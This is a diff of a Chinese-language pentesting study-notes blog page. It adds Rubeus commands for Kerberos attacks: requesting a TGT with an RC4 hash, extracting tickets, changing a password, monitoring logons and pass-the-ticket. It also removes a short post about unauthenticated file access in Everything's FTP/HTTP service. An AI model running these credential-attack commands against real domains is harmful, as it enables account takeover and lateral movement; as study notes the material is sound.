-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">请求票据</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> asktgt /user:harmj0y /rc4:<span class="number">2</span>b576acbe6bcfda7294d6bd18041b8fe</span><br><span class="line">提取票据</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> tgtdeleg</span><br><span class="line">使用票据修改密码</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> changepw /ticket:test<span class="selector-class">.kirbi</span> /new:password@<span class="number">123</span></span><br><span class="line">密码转hash</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> hash /user:evilsystem /password:evil /domain:test.local</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">请求票据</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> asktgt /user:harmj0y /rc4:<span class="number">2</span>b576acbe6bcfda7294d6bd18041b8fe</span><br><span class="line">提取票据</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> tgtdeleg</span><br><span class="line">使用票据修改密码</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> changepw /ticket:test<span class="selector-class">.kirbi</span> /new:password@<span class="number">123</span></span><br><span class="line">密码转hash</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> hash /user:evilsystem /password:evil /domain:test.local</span><br><span class="line">每隔一秒监听一次来自DNS的登陆（需要本地管理员权限）</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> monitor /interval:<span class="number">1</span> /filteruser:DNS$</span><br><span class="line">哈希传递</span><br><span class="line">Rubeus<span class="selector-class">.exe</span> ptt /ticket:base64</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://p0.ssl.qhimg.com/t01df7f513a009a2141.png" alt="img"></p>
 <h2 id="AdExplorer"><a href="#AdExplorer" class="headerlink" title="AdExplorer"></a>AdExplorer</h2><p>域成员查询</p>
@@ -2037,171 +2305,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/15/Everything敏感信息泄露/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/10/15/Everything敏感信息泄露/" itemprop="url">Everything敏感信息泄露</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-15T14:12:13+08:00">
-                2019-10-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/组件漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">组件漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Everything敏感信息泄露"><a href="#Everything敏感信息泄露" class="headerlink" title="Everything敏感信息泄露"></a>Everything敏感信息泄露</h1><blockquote>
-<p>Everything是voidtools开发的一款文件搜索工具，官网描述为“基于名称实时<a href="https://baike.baidu.com/item/定位文件" target="_blank" rel="noopener">定位文件</a>和目录（Locate files and folders by name instantly） </p>
-</blockquote>
-<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>由于配置中开启了ETP/FTP服务和HTTP服务，并且默认无身份验证，导致可以直接访问，下载服务器上的文件。</p>
-<blockquote>
-<p>配置不当 &gt; 未授权访问 &gt; 敏感信息泄露</p>
-</blockquote>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li>fofa搜索引擎搜索目标</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/15/Everything%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1.png" alt="avatar"></p>
-<ul>
-<li>未授权访问</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/15/Everything%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/2.png" alt="avatar"></p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/15/Everything%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/3.png" alt="avatar"></p>
-<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><ul>
-<li><p>关闭ETP/FTP服务和HTTP服务或者设置账户密码</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/15/Everything%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1.jpg" alt="avatar"></p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2254,7 +2357,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2265,7 +2368,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2337,7 +2440,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
